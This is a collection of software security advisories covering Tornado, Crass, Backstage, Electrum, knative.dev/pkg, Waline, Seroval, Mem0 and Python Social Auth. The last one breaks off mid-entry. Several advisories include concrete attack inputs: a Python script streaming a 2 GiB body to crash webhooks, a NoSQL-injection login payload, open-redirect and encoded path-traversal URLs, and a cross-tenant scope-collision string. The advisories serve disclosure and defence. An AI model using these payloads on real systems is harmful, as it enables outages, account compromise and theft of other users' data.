summary: Tornado: Event loop blocking and excess memory use from chunked bodies with many small chunks
description:
### Summary

When Tornado reads an HTTP/1.1 body that uses chunked transfer encoding, it processes all chunks that have already arrived without yielding to the event loop. A client can send a body made of millions of 1-byte chunks, which blocks the event loop (and therefore every other connection served by that process) for the entire time it takes to parse the body. A body near the default `max_body_size` of 100 MB can block the process for close to a minute, and the attacker can repeat or parallelize these requests.

Bodies made of tiny chunks also consumed far more memory than their size: a handler that does not use `@stream_request_body` stored each chunk as a separate object, using roughly 20 times as much memory as the bytes received.

### Impact

All Tornado HTTP servers are affected when they receive a request body for a handler that reads it, which includes any handler that does not reject the request before the body is read. No authentication is required. Lowering `max_body_size` reduces the maximum blocking time and memory use for each request but does not remove the issue.

`SimpleAsyncHTTPClient` is affected in the same way when it reads a response from a malicious server.

### Patches

Fixed in Tornado 6.6. Tornado now yields to the event loop periodically while reading any body, combines small chunks before passing them to `data_received`, and stores non-streaming bodies more compactly.

Applications using `@stream_request_body` should note that the pieces passed to `data_received` no longer correspond to HTTP chunk boundaries.

### Workarounds

- Run Tornado behind a reverse proxy that buffers request bodies and forwards them with a `Content-Length` header instead of chunked encoding.
- Lower `max_body_size` (for the whole server or for individual handlers) to limit the impact of each request.

### Credit

Reported by [uttej-badwane](https://github.com/uttej-badwane).

summary: Tornado: Open redirect in RedirectHandler via protocol-relative URLs
description:
### Summary

`tornado.web.RedirectHandler` builds its target URL by substituting parts of the request path into a template. Depending on where those substitutions appear in the template, an attacker can craft a request that redirects to a host of their choosing. This creates an open redirect on the application's domain, which can be used in phishing.

### Impact

Applications are affected if they use `RedirectHandler` with a URL template where a regex capture group can influence the scheme or host of the redirect. This includes:

- **A substitution at the start of the path**, for example `(r"/(.*)/target", RedirectHandler, {"url": "/{0}/destination"})`. A request to `https://example.com//evil.com/target` redirects to `//evil.com/destination`, a protocol-relative URL pointing to evil.com. Variants using backslashes or encoded characters have the same effect, because browsers treat them as equivalent to `//`.
- **A substitution directly after the host**, for example `(r"/old(.*)", RedirectHandler, {"url": "https://new.example.com{0}"})`. A request to `/old.evil.com/` or `/old@evil.com/` redirects to evil.com.
- **A template that begins with a substitution** (such as `"{0}"`), which can be given an absolute URL.

Applications are not affected if their `RedirectHandler` templates use only static URLs, or if every substitution comes after a fixed host and a `/` (for example `"/static/{0}"` or `"https://example.com/{0}"`). Other uses of `RequestHandler.redirect()` are not affected by this advisory, although applications that pass user-controlled input to `redirect()` should validate it themselves.

### Patches

Fixed in Tornado 6.6. `RedirectHandler` now returns a 400 error if the substituted values would change the scheme or host of the redirect from what the template specifies. As a result, substitutions can no longer be used in the scheme or host part of a template. The similar check in `StaticFileHandler` has also been hardened against backslash and whitespace variants.

### Workarounds

- Change `RedirectHandler` templates so every substitution comes after a fixed prefix ending in `/`, or write capture-group regexes that cannot match characters such as `/`, `\`, `@`, `.` or `:` where they could affect the host.
- Alternatively, replace `RedirectHandler` with a custom handler that validates the target before calling `self.redirect()`.

### Credit

Reported by Longwei Wang (@gn00295120).

summary: Tornado: Quadratic CPU usage when parsing HTTP headers with line folding
description:
### Summary

Tornado's HTTP header parser takes quadratic time (O(n²)) when a header value is continued across many "obsolete line folding" (obs-fold) lines. An unauthenticated attacker can send a request whose header block is mostly short continuation lines. Parsing it uses a large amount of CPU on the IOLoop thread and blocks every other connection that process is serving.

This issue is closely related to CVE-2025-67725 (GHSA-c98p-7wgm-6p64). The fix for that advisory covered repeated headers but not line-folded continuations.

### Impact

All Tornado HTTP servers are affected. Header parsing runs before any application code, so no authentication or particular handler is required.

How bad it gets depends on `max_header_size`:

- **Default (64 KB):** each malicious request blocks the event loop for tens of milliseconds. Repeated requests can degrade service.
- **Raised `max_header_size`:** the cost grows with the square of the header size. A single 1 MB request can block the process for several seconds.

Only availability is affected. Confidentiality and integrity are not.

### Patches

Fixed in Tornado 6.6 by removing support for obsolete line folding completely; header lines that begin with whitespace are now rejected.

### Workarounds

- Keep `max_header_size` at its default value or lower it. This limits the impact but doesn't remove it.
- Run Tornado behind a reverse proxy that rejects or normalizes obsolete line folding before forwarding requests.

### Credit

Reported by @manus-pi.

summary: Crass: Incorrect tokenization of bad URLs enables CSS sanitizer bypass
description:
## Summary

Crass's tokenizer didn't terminate a bad URL token at a `)` that followed an escaped backslash (`\\`). As a result, Crass consumed more input as part of the bad URL than a spec-compliant browser does. CSS sanitizers that parse untrusted CSS with Crass and re-emit it could be tricked into passing through declarations, style rules, or at-rules (including `@import`) that the sanitizer would otherwise have removed, but that a browser would then parse and apply.

## Details

While consuming the remnants of a bad URL (CSS Syntax Level 3, §4.3.15), Crass checked whether the *previously consumed* code point and the next code point formed a valid escape, in addition to checking the next two unconsumed code points. After an escaped backslash, the previously consumed code point is a backslash, so a following `)` was incorrectly treated as escaped and the bad URL token continued until the next unescaped `)` or the end of the input.

Browsers terminate the bad URL at that `)`, so everything Crass treated as part of the bad URL is live CSS to a browser.

This bug has existed in every released version of Crass.

## Impact

Crass by itself only mis-tokenizes input. The security impact is on CSS sanitizers that use Crass to make allow/deny decisions and then re-serialize the CSS. Exploitation requires a sanitizer that doesn't reject bad URL tokens wherever they occur. Confirmed examples (verified in Chromium against the sanitizers' output):

- **Sanitize** (all versions through 7.0.0):
  - In `Sanitize::CSS.properties` and `style` attributes, a bad URL inside a `[...]` or `(...)` block in the value of an allowlisted property can smuggle arbitrary declarations, such as `position: fixed` or a `background-image` URL with a disallowed protocol.
  - In `Sanitize::CSS.stylesheet` and `<style>` elements, a bad URL in a selector can smuggle arbitrary style rules and at-rules, including `@import`.
- **Loofah** (`Loofah::HTML5::Scrub.scrub_css`, used for `style` attributes), and therefore **rails-html-sanitizer** (`sanitize_css`, and `sanitize` when `style` is a permitted attribute): a bad URL inside an allowlisted function such as `calc()` or `rgb()` can smuggle declarations Loofah normally strips, such as `position: fixed` and `url()` values.

Smuggled CSS can be used for UI redress (clickjacking or phishing overlays), loading attacker-controlled external resources, and, where rules or `@import` can be smuggled, CSS-based data exfiltration. This vulnerability doesn't allow script execution in modern browsers.

## Patches

Fixed in Crass 1.0.8. Users of Sanitize, Loofah, rails-html-sanitizer, or any other library that uses Crass to sanitize CSS should upgrade Crass to 1.0.8 or later.

## Workarounds

There are no practical workarounds other than upgrading. Rejecting any CSS input that contains the character sequence `\\` would block the known trigger, but this is a blunt measure and may reject legitimate CSS.

## References

- CSS Syntax Module Level 3, "Consume the remnants of a bad url": https://drafts.csswg.org/css-syntax-3/#consume-remnants-of-bad-url

summary: Backstage catalog rules can be bypassed for URL locations using encoded path segments
description:
## Summary

`@backstage/plugin-catalog-backend` matches URL-type locations against `catalog.rules` location patterns using the raw URL string submitted by the user, while URL readers resolve that same string in canonical form when fetching the location's content. A URL can therefore be crafted so that it appears to belong to a trusted location scope during rule evaluation, but is fetched from a different scope.

## Details

When a deployment restricts catalog kinds to trusted URL prefixes using `catalog.rules` location patterns, `DefaultCatalogRulesEnforcer` applies glob matching directly to the raw `location.target` string. The URL readers used for ingestion resolve the same target in canonical form, including normalizing percent-encoded dot segments. A registered location such as `https://<host>/trusted/%2e%2e/attacker/repo/blob/main/catalog-info.yaml` matches a `https://<host>/trusted/**` pattern as a raw string, but resolves to and is fetched from `https://<host>/attacker/repo/...` when its content is read.

An authenticated user with permission to register catalog locations (`catalog.location.create`) can use this to have an entity from an untrusted source admitted as if it originated from a trusted location scope.

## Impact

The crossed boundary is the operator-configured catalog ingestion policy: entity content from outside the trusted location scope is ingested as if it were within it. Downstream consequences depend on deployment configuration, for example actions taken with integration credentials by processors or scaffolder when acting on the ingested entity. The assessment of this report found no basis for impact claims beyond the ingestion policy boundary itself.

## Patches

This is fixed in `@backstage/plugin-catalog-backend` 3.9.2 (Backstage release 1.54.10) and 4.0.2 (Backstage release 1.56.1). Version 4.0.1 as published is not fixed.

## Workarounds

No complete workaround is available for deployments that rely on URL location patterns to restrict catalog kinds. Restricting location registration permissions reduces exposure.

summary: Electrum: Malicious server can replace a just-broadcast tx and try to trick user into RBF-ing it
description:
### Summary

The main Electrum server the client connects to is trusted with mempool ("unconfirmed") transactions. This is documented [design](https://electrum.readthedocs.io/en/latest/faq.html#does-electrum-trust-servers). [0]

However now someone figured out a way to practically exploit it:
- when the client broadcasts a new tx1, a malicious server can swallow it,
- and update the client's history with a conflicting (invalid) tx2 that replaces the outputs with the attacker's output address.
- Tx2 has invalid signatures, but this is not checked (due to light client design).
- The wallet will display tx2 as an unconfirmed transaction - tx1 will not be displayed.
- If the client then manually RBF fee-bumps tx2, the client will sign it with a higher fee, and hence pay the attacker.

### Fixes

Commit 90fe30822 contains the fix [1], included in version 4.8.3.
The client now verifies the signatures of `wallet.is_mine` inputs for mempool txs (before adding them to its local history).

Users should upgrade (and regularly do so in any case).
As a workaround, without upgrading, when signing any transaction, for bumping the fee or not, they should verify the output addresses and amounts are as expected.

Clients that connect to servers they trust (e.g. run their own) are not affected.


### Remarks

- some servers are performing this attack in the wild
- electrum received two user-reports of this. user1 noticed after broadcasting tx1 the wallet history contained a different tx. user2 bumped the fee of tx2 and lost money.
- user1 reported tx1 was not propagated over the bitcoin p2p, so the server held it
- both reported the attacker's output address in tx2 was grinded to match the last four chars of the legit address from tx1
- based on user2's report, the server constructed a tx2 with zero fee (presumably in hope of the user bumping its fee)
- even with the fix, we still only validate "is_mine" inputs (i.e. paying from addresses that the wallet owns). So e.g. "incoming" txs are not validated. The client lacks a full consensus engine / script interpreter, though even with that, to cover non-is_mine inputs, it would have to validate the unconfirmed parents recursively until reaching mined txs. Mined txs we already SPV.


### Timeline

- 2026-10-11: user1 sends private disclosure, but the bump_fee vector is not realised
- 2026-10-18: user2 (Raju-K12) reports privately that they lost money after bump_fee
- 2026-10-23: version 4.8.3 git tagged, with the fix
- 2026-10-24: version 4.8.3 binaries released
- 2026-10-24: public disclosure


### Credits

Electrum thanks user1 and Raju-K12 for finding and responsibly disclosing this issue to us.

summary: knative.dev/pkg admission webhooks allow unbounded request-body memory exhaustion
description:
## ⚠️ Update (verification, 2026-05-19): C-2 confirmed end-to-end — **4.5× amplification observed** (worse than the advisory's conservative 2× claim)

Built a Go PoC ([`cmd/poc-c2/main.go`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/cmd/poc-c2/main.go)) that runs the exact 8-line vulnerable snippet from [`webhook/admission.go:109-117`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go#L109-L117) verbatim under the same `http.HandlerFunc` shape (the full production `admissionHandler` at `:85` requires `*Webhook` + `AdmissionController` + an informer-synced channel + controller-runtime / client-go scaffolding — the bug is the missing `http.MaxBytesReader`, nothing else in the handler). Bound to `127.0.0.1:18098`.

PoC client streamed 2 GiB of `a` bytes over a raw TCP socket. `runtime.MemStats.HeapAlloc` sampler:

```
baseline:  HeapAlloc =     0.32 MiB
peak:      HeapAlloc = 9 217.38 MiB  =  9.00 GiB
ratio:     4.50× the body size
```

The advisory predicted ~2× from `io.TeeReader` doubling the body once in `bodyBuffer`. The observed 4.5× ratio comes from the interaction of two amplifiers: `bytes.Buffer.ReadFrom` (used by `TeeReader`-fed `bodyBuffer`) doubles its backing slice on every grow, so peak occupancy during a realloc is `old + new = 3×` the live data — and `json.Decoder` holds its own working buffer in parallel. The advisory's 2× floor is comfortably exceeded.

**Downstream impact reminder**: this library backs every Knative serving / eventing controller, every Tekton Triggers / Pipelines webhook, KEDA, Sigstore policy-controller, Kpack, and many more. A 2 GiB body to **any** of those projects' admission webhook ports OOMs the controller at 4.5× the body — i.e., even a 128 MiB request OOMs a 512 MiB-limited Pod.

---

# Summary

`knative.dev/pkg`'s admission webhook handler reads the incoming HTTP request body via `json.NewDecoder(io.TeeReader(r.Body, &bodyBuffer))` with **no `http.MaxBytesReader` wrapping the body**. Because every consumer of `knative.dev/pkg/webhook` inherits this handler (Knative serving / eventing, Tekton Pipelines, KEDA, Sigstore policy-controller, and others), a single oversized POST to **any of those projects' admission webhook ports** drives the controller pod into memory exhaustion and OOM-kill. Worse, the `io.TeeReader` design keeps a verbatim copy of the body in `bodyBuffer` while the decoder also materializes the parsed struct — so the peak memory usage is roughly **twice the body size**.

This is the same shape as **CVE-2026-24514** (ingress-nginx) and `GHSA-9539-c3xr-w9vm` (Kyverno admission body OOM) filed today against the same antipattern.

# Affected versions

- `knative.dev/pkg` — `main` HEAD on `github.com/knative/pkg` (verified 2026-05-18 against [`webhook/admission.go`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go) sha `1ad5a1ce0ee7043081cb50fd1acc6d36a9126844`).
- Every release that ships the current [`webhook/admission.go`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go) handler.

# Vulnerable code

[`webhook/admission.go:109-117`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go#L109-L117):

```go
review := admissionv1.AdmissionReview{}
var bodyBuffer bytes.Buffer
if err := json.NewDecoder(io.TeeReader(r.Body, &bodyBuffer)).Decode(&review); err != nil {
    http.Error(w, fmt.Sprintf("could not decode body: %v", err), http.StatusBadRequest)
    return
}
```

There is no `http.MaxBytesReader` around `r.Body`. The standard library's `json.NewDecoder` will read until EOF or the matching closing `}`. The `io.TeeReader` simultaneously copies every byte read from `r.Body` into `bodyBuffer`, which the rest of the handler uses for the response trailer / observability.

# Downstream impact (the reason this matters)

`knative.dev/pkg/webhook` is the **default admission-webhook scaffolding for the entire Knative + CNCF webhook ecosystem**:

| Consumer | Repo | Webhook surface |
|---|---|---|
| Knative serving | `knative/serving` | resource validation / defaulting |
| Knative eventing | `knative/eventing` | resource validation / defaulting |
| Tekton Pipelines | `tektoncd/pipeline` | Pipeline / Task / TaskRun validation |
| Tekton Triggers | `tektoncd/triggers` | EventListener / Trigger validation |
| KEDA | `kedacore/keda` | ScaledObject / ScaledJob validation |
| Sigstore policy-controller | `sigstore/policy-controller` | ClusterImagePolicy mutating + validating |
| Kpack | `buildpacks-community/kpack` | Image / Builder validation |
| ... | | |

Every one of these consumers ships the same `io.ReadAll`-equivalent body read with **no upper bound**. A pod-network-reachable attacker can OOM-kill any of them with a single large POST. `failurePolicy=Fail` admission webhooks (the secure-default) then take the namespace's or cluster's admission flow offline until the controller restarts.

# Impact

- **Class**: CWE-770 unbounded allocation. Reachable from any pod-network client.
- **Severity per consumer**: depends on how each consumer configures `failurePolicy`. For projects with `failurePolicy=Fail` (e.g., Sigstore policy-controller's image-policy enforcement), the consequence is cluster-wide admission outage. For `failurePolicy=Ignore`, the consequence is "this project's webhook is offline" but the API server continues admitting requests.
- **Severity**: matches the broader CVE-2026-24514 / GHSA-9539-c3xr-w9vm. Single-packet DoS on the library; each downstream consumer inherits the bug.

# Reproduction

The exact same PoC built against Kyverno's admission handler reproduces this:

```python
import socket
total = 2 << 30   # 2 GiB
s = socket.create_connection(('<knative-or-tekton-webhook-host>', 8443))
s.sendall(b'POST /<admission-path> HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % total)
chunk = b'a' * (1 << 20)
for _ in range(total >> 20): s.sendall(chunk)
```

Observed against the Kyverno admission handler (same antipattern):

```
baseline:        HeapAlloc=7 MiB     Sys=22 MiB
after read:      HeapAlloc=9500 MiB  Sys=9548 MiB  (4 GiB body → 9.5 GiB peak; io.TeeReader doubles)
```

For the knative/pkg version, the `io.TeeReader` doubles the resident memory (one copy in the decoder's accumulating slice, one in `bodyBuffer`). A `kyverno-admission-controller`-equivalent Pod with a 256 MiB memory limit OOM-kills with ~128 MiB of body.

# Suggested fix

Wrap the request body with `http.MaxBytesReader` (and add a `http.StatusRequestEntityTooLarge` branch on the `MaxBytesError` path):

```go
const maxAdmissionRequestSize = 8 << 20 // 8 MiB — controller-runtime's default; large enough for Kubernetes' own admission objects
r.Body = http.MaxBytesReader(w, r.Body, maxAdmissionRequestSize)
var bodyBuffer bytes.Buffer
review := admissionv1.AdmissionReview{}
if err := json.NewDecoder(io.TeeReader(r.Body, &bodyBuffer)).Decode(&review); err != nil {
    var mbe *http.MaxBytesError
    if errors.As(err, &mbe) {
        http.Error(w, "admission body exceeds maximum size", http.StatusRequestEntityTooLarge)
        return
    }
    http.Error(w, fmt.Sprintf("could not decode body: %v", err), http.StatusBadRequest)
    return
}
```

This propagates a fix to **every downstream consumer** with no API change, and the cap can be made configurable per-server via a new field on the `webhook.Options` struct.

# Disclosure

Reporting privately under your security policy. No public disclosure on my side until you have a fix or coordinated timeline. Encourage maintainers to coordinate with downstream consumers (Knative, Tekton, KEDA, Sigstore) on simultaneous release.

# Reporter

tonghuaroot (tonghuaroot@gmail.com)

summary: Waline login accepts a non-string email as a match-all MongoDB query
description:
## Summary

The login endpoint POST /api/token reads the `email` field from the request body without checking its type and passes it straight into the MongoDB storage query. When `email` is not a string (for example a JSON object such as {"$ne": null}), the MongoDB storage adapter's parseWhere silently DROPS the field rather than rejecting the request, producing an empty filter that matches ALL users. The endpoint then verifies the submitted password against the FIRST user returned (user[0]), which in Waline is the first-registered user — the site administrator.

This is a PARTIAL authentication bypass, not a full one. The attacker still needs a valid password for that first user; this is not a zero-knowledge bypass and it does not disclose passwords. Its concrete effects are: (1) the email/identifier factor is removed for the administrator account, (2) user enumeration (a non-string email never fails the "no such user" branch), and (3) credential-stuffing amplification — an attacker can test a leaked or weak password against the administrator account without knowing the administrator's email.

## Details

Untyped input — packages/server/src/controller/token.js:17-18:
```
    const { email, password, code } = this.post();
    const user = await this.modelInstance.select({ email });
````
`email` comes from the request body with no type check.

The storage adapter silently drops a non-string key — packages/server/src/service/storage/mongodb.js, parseWhere():
```
    if (think.isString(where[k])) { filter[parseKey(k)] = { $eq: ... }; continue; }   // intended guard
    if (where[k] === undefined) { ... }
    if (Array.isArray(where[k]) && where[k][0]) { ... operator handling (IN/LIKE/!=/> ...) }
```
A plain object such as {"$ne": null} is neither a string, undefined, nor an array, so NONE of the branches run and nothing is added to `filter` for `email`. The result is filter = {} -> instance.where({}) -> MongoDB find({}) returns every user. (The array form, e.g. ["!=", ""], is a genuine operator injection that reaches $ne with the same match-all effect.)

First user is selected — token.js:22-26:
```
    if (think.isEmpty(user) || isVerifyUser || isBannedUser) { return this.fail(); }   // match-all -> not empty -> passes
    const checkPassword = this.checkPassword(password, user[0].password);
```
user[0] is the first record in MongoDB natural (insertion) order, i.e. the earliest-registered user, which in Waline is the administrator.

No upstream type validation — packages/server/src/logic/token.js:37-38:
```
    async postAction() { await this.useCaptchaCheck(); }
```
The only pre-check is the captcha; there is no isString(email/password) validation.

## Proof of Concept

Send a login request whose email is a non-string value:
```
    POST /api/token  HTTP/1.1
    Content-Type: application/json

    {"email": {"$ne": null}, "password": "<password-to-test>"}
```
- Because `email` is not a string, parseWhere adds nothing for it, so the query filter is {} and MongoDB returns all users.
- user[0] — the first-registered user, i.e. the administrator — is selected, and the submitted password is checked against the administrator's hash.
- If the password matches (for example via credential stuffing or a known/weak password), the attacker is authenticated as the administrator without ever knowing the administrator's email.
- Even when the password does not match, the request confirms that users exist (enumeration) and that the email factor is bypassable.

## Impact

An unauthenticated attacker can bypass the email/identifier factor of authentication for the first-registered user (the administrator) and have an arbitrary password checked directly against that account. This:
- enables user enumeration;
- amplifies credential stuffing against the administrator (no need to know the admin email — a leaked or weak password can be tested directly);
- and, when the attacker possesses a valid password for that account (e.g. a reused/breached one), results in administrator login.

This is bounded: it is NOT a zero-knowledge authentication bypass, it does NOT reveal passwords, and it targets the first-returned user rather than an arbitrary chosen account. It is rated Medium accordingly. (If exploitation succeeds in logging in, the attacker then holds the administrator session; that downstream impact is conditional on already having a valid password, which is reflected in the High attack complexity rather than in the confidentiality/integrity metrics.)

## Remediation

Validate the types of `email` and `password` as strings before they reach the storage query — for example in packages/server/src/logic/token.js postAction():
```
    const { email, password } = this.post();
    if (!think.isString(email) || !think.isString(password)) {
      return this.ctx.throw(400, 'Invalid input type');
    }
```
Defense in depth: in mongodb.js parseWhere(), reject (rather than silently drop) a value that is neither a string nor a supported array form, or coerce it to {$eq: String(value)}, so a non-string key can never elide the filter.

summary: Seroval: Code injection through a typed array's own constructor property
description:
### Summary

seroval writes a typed array as a call to its constructor. In affected versions, the constructor name in the output is read from a property that data on the value can replace, and it is written without checks. A typed array that received properties from untrusted data can then put arbitrary code into the serialized output.

### Details

Version 1.6.0 changed how seroval finds the class of an object, so that objects with their own `constructor` property serialize correctly. Typed arrays still took the constructor name from the value itself, so the name could come from the untrusted property instead of the array's real type.

These functions are affected:

- `serialize`, `serializeAsync`
- `crossSerialize`, `crossSerializeAsync`, `crossSerializeStream`
- the `Serializer` class
- `compileJSON`

`fromJSON` and `fromCrossJSON` are not affected: they only accept the names of the built-in typed arrays. With the `compactArrayBufferViews` option, the same lookup throws a `TypeError` instead of writing code.

### Impact

An application is affected only when it serializes a typed array that has an own `constructor` property set from untrusted data. That requires code that copies properties from untrusted objects onto a typed array. This is unusual, so the severity is rated Low, even though the result is script execution in the page that receives the output.

### Patches

Fixed in 1.6.11. The constructor name now comes from the array's internal type, which properties on the value cannot change. `compactArrayBufferViews` uses the real type as well.

### Workarounds

If you cannot upgrade, do not copy properties from untrusted objects onto typed arrays, or remove an own `constructor` property from a typed array before serializing it.

summary: Seroval: Script injection through RegExp sources in serialized output
description:
### Summary

seroval writes a `RegExp` as a regular expression literal. In affected versions, the `<` character in a `RegExp` source is written without escaping. A source built from untrusted input can then end the HTML `<script>` element that the serialized output is placed in, and run script in the page.

### Details

seroval escapes `<` in strings, so string values cannot end a `<script>` element. `RegExp` sources did not get the same escaping:

- Versions before 1.0.0 wrote the source as is.
- Version 1.5.5 stopped escaping `<` in `RegExp` sources, so that named groups and lookbehinds keep working. This removed the escaping for every `<` in a source.

These functions are affected:

- `serialize`, `serializeAsync`
- `crossSerialize`, `crossSerializeAsync`, `crossSerializeStream`
- the `Serializer` class
- `compileJSON`

`toJSON`, `fromJSON`, `toCrossJSON` and `fromCrossJSON` are not affected, because they never produce JavaScript.

### Impact

An application is affected when all of these are true:

1. It builds a `RegExp` from untrusted input that is used as regular expression syntax. Input passed through an escaping helper (such as an `escapeRegExp` function) is not enough to exploit this.
2. It serializes that `RegExp` with one of the functions above.
3. It places the output inside an HTML `<script>` element, as server rendering usually does.

In that case an attacker can run script in the page of any user who receives that output.

### Patches

Fixed in 1.6.10. A `RegExp` whose source contains `<` is now written with the `RegExp` constructor and an escaped string source. Named groups and lookbehinds keep working.

### Workarounds

If you cannot upgrade:

- Do not serialize a `RegExp` built from untrusted pattern syntax. Send its source and flags as strings, and build the `RegExp` on the client.
- Or reject patterns that contain `<` before they reach the serializer.

summary: Seroval: fromJSON deserializer trusts node-supplied array length and sequence doneAt (unauthenticated event-loop DoS)
description:
### Summary

`fromJSON` and `fromCrossJSON` used two node fields without checking them.

- An array node's element list was not checked to be an array. A small payload could set the length the decoder looped over. This part is also tracked in GHSA-wp97-x4hv-qvhp.
- A sequence node's done index was not checked. A crafted value produced an iterator that never finished.

### Impact

A service that passes untrusted input to `fromJSON` or `fromCrossJSON` can be made unavailable by an unauthenticated request.

- The array case blocks the thread while the decoder runs.
- The sequence case makes any code that reads the resulting iterator to the end run forever.

### Patches

Fixed in `seroval@1.6.8`.

- Element lists must be arrays.
- A sequence node's throw and done indices must be integers from -1 up to the last element index.

Invalid input throws `SerovalMalformedNodeError`.

### Workarounds

None. Upgrade to 1.6.8.

Improper Validation of Specified Quantity in Input

summary: Seroval `fromJSON`/`fromCrossJSON` denial of service via unvalidated array node length
description:
### Summary

`fromJSON` and `fromCrossJSON` did not check that an array node's element list is an array. A small crafted payload could set the length the decoder used. That length controlled how much memory was allocated and how many times the decoder looped, and it did not depend on the size of the payload.

### Impact

A service that passes untrusted input to `fromJSON` or `fromCrossJSON` can be made unavailable by an unauthenticated request.

- A small payload can allocate enough memory to end the process.
- A small payload can block the thread for seconds, or without end.

This affects any framework that decodes request bodies with these functions before its own validation runs.

This issue is a bypass of the fix for GHSA-66fc-rw6m-c2q6 in 1.4.1.

### Patches

Fixed in `seroval@1.6.8`. The deserializer now rejects any node whose element list is not an array, and throws `SerovalMalformedNodeError`.

### Workarounds

None. Upgrade to 1.6.8.

summary: Seroval: Deserialization invokes attacker-chosen callables: AsyncIteratorFactoryInstance calls source.on(listener) without type check
description:
### Summary

When `fromJSON` rebuilt an async iterator, it called `on()` on the iterator's source without checking that the source was a seroval stream. A crafted payload could pick another value as the source, such as a function returned by an application plugin. The deserializer then called that value's `on` method.

This is a variant of GHSA-mv8w-475r-vwqw. That fix covered the promise and stream control nodes but not the async iterator node.

### Impact

An application that passes untrusted input to `fromJSON` with plugins that return callable values can have those callables invoked during deserialization. What this allows depends on what the plugin's values do.

### Affected versions

- Versions up to 1.6.3 accept any value as the source.
- 1.6.4 rejects the reported payload.
- 1.6.5 to 1.6.7 check the source by node type, which a payload can get around by reusing a node id.
- All versions up to 1.6.7 should be treated as affected.

### Patches

Fixed in `seroval@1.6.8`. Streams and sequences are now internal class instances. The deserializer checks the source value with `instanceof`, so plain data and plugin values are rejected no matter which node id they use.

### Workarounds

Avoid plugins whose `deserialize` returns functions or objects with an `on` method when decoding untrusted input. Upgrading to 1.6.8 is recommended.

summary: Mem0: Cross-tenant conversation leak via unescaped delimiter collision in session-scope key (_build_session_scope)
description:
Summary

_build_session_scope() in mem0/memory/main.py builds the conversation-history scope key used to fetch/store the last N raw messages by naively joining caller-supplied user_id/agent_id/run_id values with unescaped & and = delimiters:

def _build_session_scope(filters):
    parts = []
    for key in sorted(["user_id", "agent_id", "run_id"]):
        val = filters.get(key)
        if val:
            parts.append(f"{key}={val}")
    return "&".join(parts)

_validate_and_trim_entity_id() (the only validation applied to these values) rejects only empty/whitespace-only strings — it never forbids & or =. This scope string is then used as an exact-match key against a SQLite column (storage.py: WHERE session_scope = ?) to fetch the last 10 raw messages for a given scope (main.py, Phase 0 of _add_to_vector_store, both sync and async).

Impact

Any caller who controls only their own run_id (or agent_id) — a very common integration shape, since apps frequently pass a client-/session-supplied identifier straight through as run_id without namespacing — can craft a value containing &user_id=<victim> (or &agent_id=<victim>) that produces a scope string byte-for-byte identical to a different tenant's real scope string.

Concretely: Tenant A calls add(msgs, user_id="alice", run_id="proj-x") → scope "run_id=proj-x&user_id=alice". An attacker who can only set run_id calls add(msgs, run_id="proj-x&user_id=alice") → identical scope string. The attacker's next add() call:

1. Reads Tenant A's raw prior conversation via get_last_messages(session_scope) and splices it verbatim into the attacker's own LLM fact-extraction prompt — a direct cross-tenant confidentiality leak (conversation content, potentially including PII, credentials, etc.).
2. Writes into the same colliding row-set via save_messages(), whose eviction logic (DELETE FROM messages WHERE session_scope = ? AND id NOT IN (...)) can evict/interleave Tenant A's history — permanent cross-tenant data corruption, not just a read.

Reachable via the public Memory.add() / AsyncMemory.add() API, and by extension the REST server's POST /memories endpoint (which takes run_id/agent_id straight from the request body).

Reproduction

from mem0.memory.main import _build_session_scope

# Tenant A: real user_id + run_id
scope_a = _build_session_scope({"user_id": "alice", "run_id": "proj-x"})
print(scope_a)  # "run_id=proj-x&user_id=alice"

# Attacker: controls only run_id, embeds a fake user_id inside it
scope_c = _build_session_scope({"run_id": "proj-x&user_id=alice"})
print(scope_c)  # "run_id=proj-x&user_id=alice"

assert scope_a == scope_c  # byte-for-byte collision

A full end-to-end proof (actual add() calls, no mocking of the vulnerable functions) confirms the attacker's subsequent add() call receives the victim's raw prior message content via get_last_messages.

Suggested Fix

Reject & and = in _validate_and_trim_entity_id(), alongside the existing whitespace check — this is the single validation chokepoint already used by every entry point (add, search, get_all, delete_all), so the fix is centralized. Alternatively/additionally, encode each component unambiguously (percent-encode each id, or use a length-prefixed/JSON-encoded scope key) so no valid-character combination in one field can ever collide with a different partition.

Also affected: TypeScript SDK (npm mem0ai)

The same flaw exists in mem0-ts/src/oss/src/memory/index.ts,
Memory.buildSessionScope(), which joins agent_id/run_id/user_id into the same
`key=value&key=value` string with the delimiters unescaped:

  private buildSessionScope(filters: SearchFilters): string {
    const parts: string[] = [];
    for (const key of ["agent_id", "run_id", "user_id"].sort()) {
      const val = (filters as any)[key];
      if (val) parts.push(`${key}=${val}`);
    }
    return parts.join("&");
  }

The scope string is used the same way, as an exact-match key into the messages
table via SQLiteManager.getLastMessages() and saveMessages(), so the identical
forge, cross-tenant read and eviction all apply.

Verified against the current releases as of 2026-07-26: pip mem0ai v2.0.14 and
npm mem0ai ts-v3.1.2 both still contain the unescaped join.

Reporter: Abhinav Singh (GitHub: OfficialAbhinavSingh)

summary: Python Social Auth: OpenID Connect nonce is not bound to the browser session, so a stolen authorization code logs the attacker in as the victim
description:
### Summary

The generic OpenID Connect backend (`OpenIdConnectAuth` and every backend built on it) stores the `nonce` in the shared Association table, not in the user's session. When the ID token comes back, `validate_claims` only checks that the nonce exists in that table and is not expired. It does not check that the nonce was issued to the browser that is finishing the login.

So the nonce does not do its job. OIDC Core (section 15.5.2) and RFC 9700 (section 4.5) use the nonce to stop authorization code injection: an attacker who gets hold of a victim's unused authorization code should not be able to redeem it in the attacker's own browser. With social-auth-core, the attacker can. They start their own login to get a valid `state` for their session, then hit the callback with the victim's `code` and their own `state`. `state` passes because it belongs to the attacker's session, and the nonce in the victim's ID token passes because it is in the global table. The attacker's browser is now logged in as the victim.

PKCE would block this, but `OpenIdConnectAuth` sets `DEFAULT_USE_PKCE = False` (the OAuth2 base class defaults to `True`), so the nonce is the only binding in the default setup.

### Tested versions

